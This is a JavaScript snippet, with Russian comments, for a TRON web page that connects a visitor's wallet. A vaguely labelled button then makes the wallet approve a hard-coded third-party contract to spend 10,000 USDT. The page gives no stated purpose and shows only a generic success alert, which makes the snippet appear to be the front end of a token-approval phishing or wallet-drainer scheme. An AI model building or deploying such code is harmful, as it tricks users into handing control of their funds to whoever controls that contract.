const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

// Официальный адрес контракта USDT (TRC20) в сети TRON
const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Адрес вашего смарт-контракта (куда дается разрешение)
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Кнопка подключения кошелька
connectBtn.addEventListener('click', async () => {
    try {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            userAddress = window.tronWeb.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            alert('Кошелек не найден! Откройте сайт через встроенный DApp-браузер кошелька.');
        }
    } catch (error) {
        console.error("Ошибка:", error);
    }
});

// Кнопка выполнения запроса (Approve)
transferBtn.addEventListener('click', async () => {
    try {
        if (!userAddress) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос разрешения (Approve) на USDT...");

        // Подключаемся к официальному контракту USDT
        const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
        
        // Сумма для одобрения (например, 10 000 USDT с учетом 6 знаков после запятой)
        const approveAmount = '10000000000'; 

        // Вызываем функцию approve для вашего контракта
        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("Хэш транзакции approve:", tx);

    } catch (error) {
        console.error("Ошибка при отправке запроса:", error);
        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
    }
});
